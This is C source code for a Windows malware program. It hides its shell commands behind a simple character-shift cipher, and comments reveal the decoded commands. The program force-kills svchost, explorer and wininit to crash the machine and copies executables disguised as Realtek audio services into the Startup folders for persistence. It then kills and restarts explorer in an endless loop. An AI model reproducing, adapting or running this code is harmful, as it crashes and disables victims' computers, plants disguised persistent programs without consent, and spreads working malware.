#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void decrypt(char *text, int shift)
{
    int length = strlen(text);
    for (int i = 0; i < length; i++)
    {
        text[i] = (char)((int)text[i] - shift);
    }
}

char text_1[] = "vcummknn\"1ko\"uxejquv\"1h";
char text_2[] = "vcummknn\"1ko\"uxejquv0gzg\"1h";
char text_3[] = "vcummknn\"1ko\"gzrnqtgt0gzg\"1h";
char text_4[] = "ykpkpkv";
char text_5[] = "rqygtujgnn0gzg\"/Eqoocpf\"^$ykpkpkv^$";
char text_6[] = "uvctv\"TvmCwfWUgtxkeg860gzg";

char text_7[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
char text_8[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
char text_9[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
char text_10[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";

void trybsod()
{
    system(text_1);
    //1 taskkill /im svchost /f
    system(text_2);
    //2 taskkill /im svchost.exe /f

    system(text_3);
    //3 taskkill /im explorer.exe /f

    system(text_4);
    //4 wininit
    system(text_5);
    //5 powershell.exe -Command \"wininit\"

    system(text_6);
    //6 start RtkAudUService64.exe


    
    // for user --------------------------------------
    
    system(text_7);
    //7 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y

    system(text_9);
    //9 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y


    // for admin --------------------------------------

    system(text_8);
    //8 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y

    system(text_10);
    //10 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
}

void spam()
{
    system(text_3);
    //3 taskkill /im explorer.exe /f

    Sleep(200);
    system("explorer");
}


int main()
{
    Sleep(3000);

    decrypt(text_1, 2);
    decrypt(text_2, 2);
    decrypt(text_3, 2);
    decrypt(text_4, 2);
    decrypt(text_5, 2);
    decrypt(text_6, 2);

    decrypt(text_7, 2);
    decrypt(text_8, 2);
    decrypt(text_9, 2);
    decrypt(text_10, 2);

    for (int i = 0; i < 3; i++)
    {
        trybsod();

        Sleep(1000);
    }

    while (1)
    {
        spam();
    }

    
        
    return 0;
}